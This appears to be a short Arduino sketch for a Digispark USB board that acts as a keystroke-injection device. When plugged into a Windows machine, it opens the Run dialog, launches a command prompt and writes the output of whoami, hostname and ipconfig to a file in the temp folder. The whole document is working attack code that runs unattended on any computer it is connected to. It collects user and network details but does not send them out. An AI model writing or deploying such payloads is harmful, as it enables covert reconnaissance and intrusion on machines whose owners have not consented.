#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(8000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.println("echo --- START --- > info.txt");
  DigiKeyboard.println("whoami >> info.txt");
  DigiKeyboard.println("hostname >> info.txt");
  DigiKeyboard.println("ipconfig >> info.txt");
  DigiKeyboard.println("exit");
}

void loop() {}